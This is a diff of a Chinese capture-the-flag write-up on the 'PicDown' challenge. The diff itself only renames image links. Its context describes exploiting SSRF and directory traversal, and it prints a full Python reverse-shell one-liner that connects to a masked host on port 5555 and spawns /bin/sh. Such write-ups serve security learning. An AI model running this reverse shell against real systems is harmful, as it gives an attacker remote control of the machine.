@@ -16,7 +16,7 @@
 
 一开始以为PicDown是下载图片，试了一下发现就是SSRF
 
-![](<../../.gitbook/assets/image (18) (1).png>)
+![](<../../.gitbook/assets/image (18) (1) (1).png>)
 
 尝试目录穿越文件读取，最后有个app用户
 
@@ -101,7 +101,7 @@ if __name__ == '__main__':
 
 ![](<../../.gitbook/assets/image (19) (1) (1).png>)
 
-![](<../../.gitbook/assets/image (6) (1) (1).png>)
+![](<../../.gitbook/assets/image (6) (1) (1) (1).png>)
 
 由于无回显，这又是用的python2，所以直接用python反弹shell即可
 
@@ -109,7 +109,7 @@ if __name__ == '__main__':
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("****",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![](<../../.gitbook/assets/image (8) (1).png>)
+![](<../../.gitbook/assets/image (8) (1) (1).png>)
 
 ## 小结
 
